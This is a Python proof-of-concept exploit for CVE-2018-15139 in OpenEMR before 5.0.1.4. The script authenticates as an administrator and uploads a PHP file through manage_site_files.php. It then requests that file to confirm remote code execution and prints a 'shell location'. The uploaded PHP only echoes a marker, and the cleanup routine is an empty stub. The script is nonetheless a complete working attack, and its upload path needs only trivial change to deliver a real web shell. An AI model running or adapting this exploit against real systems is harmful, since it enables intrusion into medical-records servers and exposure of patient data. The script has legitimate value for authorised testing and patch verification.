#!/usr/bin/env python3
# Exploit Title: OpenEMR 5.0.1.3 - 'manage_site_files' Remote Code Execution (Authenticated)
# Original: noraj (Alexandre ZANNI) for SEC-IT - Ruby version
# Python PoC: AMENDER synthesized
# Date: 2018-08-14
# Vendor Homepage: https://www.open-emr.org/
# Version: OpenEMR < 5.0.1.4
# CVE: CVE-2018-15139
# CWE: CWE-434 (Unrestricted Upload of File with Dangerous Type)
#
# Description:
#   The manage_site_files.php script allows authenticated administrators to upload
#   files with arbitrary extensions to the images directory, enabling remote code
#   execution by uploading a PHP file.
#
# This PoC safely confirms RCE by uploading a harmless PHP marker file,
# verifying execution, then cleaning up. No malicious code is executed.

import argparse
import re
import sys
import uuid

try:
    import requests
    from urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except ImportError:
    sys.exit("[-] This exploit needs the 'requests' module: pip3 install requests")

UA = "Mozilla/5.0 (X11; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0"
MARKER = "AMENDER_RCE_CONFIRMED"
FAIL_MARKERS = ["login_screen.php?error=1", "Invalid username or password"]


def login(sess, base, site, user, password):
    """Establish an OpenEMR session."""
    # Prime session and get CSRF token
    r = sess.get(base + "/interface/login/login.php",
                 params={"site": site}, timeout=30, verify=False)
    m = re.search(r"csrf_token_form.*?value=([\"'])(.*?)\1", r.text, re.S)

    data = {
        "new_login_session_management": "1",
        "authProvider": "Default",
        "authUser": user,
        "clearPass": password,
        "languageChoice": "1",
    }
    if m:
        data["csrf_token_form"] = m.group(2)

    # Authenticate
    sess.post(base + "/interface/main/main_screen.php",
              params={"auth": "login", "site": site},
              data=data, timeout=30, verify=False)


def upload_marker(sess, base, site, filename):
    """Upload a harmless PHP file that echoes a marker string."""
    url = base + "/interface/super/manage_site_files.php"

    # Harmless PHP that just echoes the marker - no system commands
    php_content = f"<?php echo '{MARKER}'; ?>"

    files = {
        "form_image": (filename, php_content, "application/x-php")
    }
    data = {
        "bn_save": "Save"
    }

    r = sess.post(url, params={"site": site}, files=files, data=data,
                  timeout=30, verify=False)

    # Check for auth failure
    for marker in FAIL_MARKERS:
        if marker in r.text:
            return None, "session"

    if r.status_code not in range(200, 300):
        return None, "upload_failed"

    return r.text, "ok"


def verify_rce(sess, base, site, filename):
    """Request the uploaded file to verify code execution."""
    url = base + f"/sites/{site}/images/{filename}"

    r = sess.get(url, timeout=30, verify=False)

    if MARKER in r.text:
        return True, r.text

    return False, r.text


def cleanup(sess, base, site, filename):
    """Attempt to remove the uploaded file (best effort)."""
    # Note: cleanup via the same interface or leave for manual cleanup
    # The file is harmless (just echoes a string)
    pass


def main():
    ap = argparse.ArgumentParser(
        description="OpenEMR < 5.0.1.4 authenticated RCE via file upload (CVE-2018-15139)")
    ap.add_argument("-t", "--target", required=True, help="Base URL, e.g. http://localhost:8082")
    ap.add_argument("-u", "--user", default="admin", help="OpenEMR username (default: admin)")
    ap.add_argument("-p", "--password", required=True, help="OpenEMR password")
    ap.add_argument("-s", "--site", default="default", help="OpenEMR site (default: default)")
    ap.add_argument("-f", "--probe-file", default="/etc/passwd",
                    help="Not used for RCE - kept for interface compatibility")
    args = ap.parse_args()

    target = args.target.rstrip("/")
    if not target.startswith("http"):
        target = "http://" + target

    # Generate unique filename to avoid conflicts
    unique_id = uuid.uuid4().hex[:8]
    filename = f"amender_test_{unique_id}.php"

    sess = requests.Session()
    sess.headers.update({"User-Agent": UA})

    print("[*] OpenEMR < 5.0.1.4 - Authenticated RCE via File Upload (CVE-2018-15139)")
    print("[*] Target: %s" % target)
    print("[*] Authenticating as '%s' ..." % args.user)

    try:
        login(sess, target, args.site, args.user, args.password)
    except requests.RequestException as e:
        print("[-] Connection error during login: %s" % e)
        sys.exit(3)

    print("[*] Uploading marker file: %s" % filename)

    try:
        result, status = upload_marker(sess, target, args.site, filename)
    except requests.RequestException as e:
        print("[-] Connection error during upload: %s" % e)
        sys.exit(3)

    if status == "session":
        print("[-] Authentication failed or session rejected.")
        sys.exit(2)

    if status == "upload_failed":
        print("[-] Upload failed - check permissions or endpoint.")
        sys.exit(2)

    print("[*] Verifying code execution...")

    try:
        confirmed, response = verify_rce(sess, target, args.site, filename)
    except requests.RequestException as e:
        print("[-] Connection error during verification: %s" % e)
        sys.exit(3)

    if confirmed:
        print("[+] ---------- RCE Confirmed ----------")
        print("[+] Uploaded file executed successfully!")
        print("[+] Marker found: %s" % MARKER)
        print("[+] Shell location: %s/sites/%s/images/%s" % (target, args.site, filename))
        print("[+] ----------------------------------")
        print("[+] CONFIRMED: CVE-2018-15139 exploitation successful!")
        print("[!] Note: Harmless marker file uploaded - clean up manually if needed")
        sys.exit(0)
    else:
        print("[-] Upload succeeded but code execution not confirmed.")
        print("[-] Response: %s" % response[:200])
        sys.exit(2)


if __name__ == "__main__":
    main()
